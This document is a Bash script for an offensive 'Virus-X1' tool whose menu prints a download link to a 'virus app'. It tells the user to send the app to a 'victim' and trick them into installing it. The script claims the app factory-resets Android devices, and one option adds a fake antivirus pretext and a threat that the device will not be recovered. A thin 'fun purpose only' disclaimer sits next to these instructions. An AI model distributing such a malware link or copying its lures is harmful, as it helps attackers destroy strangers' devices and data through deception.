# A tool by MD Asif Hasan
# if u copy Give Me Credit
# Colours
#-----------------
red="\e[91m"
rset="\e[0m"
grn="\e[92m"
ylo="\e[93m"
blue="\e[94m"
cyan="\e[96m"
pink="\e[95m"
#-----------------
# scripting start
banner(){
echo -e '\e[93m               
――――――Tool Created By MD Asif Hasan (DetaSploit)――――――
'
echo " " 
echo -e "$grn ――――――$ylo All praise is for Allah$grn $grn――――――$rset"
echo 
# Functions
echo -e "$grn [\e[93m•\e[92m]$red Virus―X1 : $ylo Crash Any Android Device Using Virus-X1 $rset"
echo " "
echo " "
}
baner1(){
clear
echo -e '\e[93m               
――――――Tool Created By MD Asif Hasan (DetaSploit)――――――
'
echo " "
echo -e "$grn ――――――$ylo MD Asif Hasan$grn $grn――――――$rset"
echo
# Functions
echo -e "$grn [\e[93m•\e[92m]$red Virus―X1 : $ylo Crash Any Android Device Using Virus-X1 $rset"
echo " "
echo " "
}
menu(){
echo -e "$grn ――――――$ylo Select Option$grn ―――――― $rset"
echo " "
echo " "
echo -e "$grn [\e[93m•\e[92m] Virus――1"
echo -e "$grn [\e[93m•\e[92m] Virus――2"
echo -e "$grn [\e[93m•\e[92m] Follow――3"
echo -e "$grn [\e[93m•\e[92m] Exit――4"
echo -e "$grn [\e[93m•\e[92m] Update――5"
echo -e "$grn [\e[93m•\e[92m] Creator : MD Asif Hasan ($red DetaSploit$red $grn)$rset"
echo " "
echo -ne "\e[92m――――――\e[92m# "
read optnz
if [ $optnz = "1" ];
then
virus
elif [ $optnz = "2" ];
then
save
elif [ $optnz = "3" ];
then
am start -a android.intent.action.VIEW -d https://facebook.com/DetaSploit > /dev/null 2>&1
banner
menu
elif [ $optnz = "4" ];
then
exit 1
elif [ $optnz = "5" ];
then
upd
else
echo "Wrong"
exit
fi
}
virus(){
################
clear
echo
echo -e '\e[92m 
――――――Tool Created By MD Asif Hasan (DetaSploit)――――――
'

echo " "
echo -e "\e[91m  Copy below link and paste in any browser and download virus app and send  to ur victim and just say install it 
device it will be factory reset and lot more happens.
                                👇👇👇

         \e[92mLINK :- \e[96mhttps://dlsharefile.com/file/1429135210\e[91m

                                 👆👆👆
Use only for fun purpose not for harming someone .
And we are not responsible for any missuse or illegal activites. 
you do to other's by this script.

――――――Type exit"
echo
echo -ne "\e[92m――――――\e[92m# "
read exitz
if [ $exitz = "exit" ];
then
banner
menu
else
banner
menu
fi
}
save(){
clear
echo
echo -e '\e[92m 
――――――Tool Created By MD Asif Hasan (DetaSploit)――――――
'

echo " "
echo " "
echo -e "\e[91m  Copy below link and paste in any browser and download virus app and send to  ur victim and just say install it
that he should install this application or else his 
device will not be recovered.(Antivirus)
                    👇👇👇

        \e[92mLINK :- \e[96mhttps://dlsharefile.com/file/1429135210\e[93m

                    👆👆👆
Use only for fun purpose not for harming someone . 
And we are not responsible for any missuse or illegal activites.
you do to other's by this script.

――――――Type exit"
echo
echo -ne "\e[92m――――――\e[92m# "
read exitz
if [ $exitz = "exit" ];
then
banner
menu
else
banner
menu
fi
}
upd(){
if [ -d "$HOME/Virus-X1" ];
then
cd $HOME
rm -rf Virus-X1
elif [ -d "$HOME/Virus-X1" ];
then
cd $HOME
rm -rf Virus-X1
else
echo
exit 1
fi
cd $HOME
sleep 1
echo -e "         \e[96mUpdate is Going on, Please Wait For a While...!\e[0m"
echo
printf "                     \e[96m["
# While process is running...
while git clone https://github.com/DetaSploit/Virus-X1 2> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
echo
echo
echo
printf "\e[96m           Tool Successfully Updated..!\e[0m"
sleep 2.0
cd $HOME
cd Virus-X1
bash virus-x1.sh
}
banner
menu
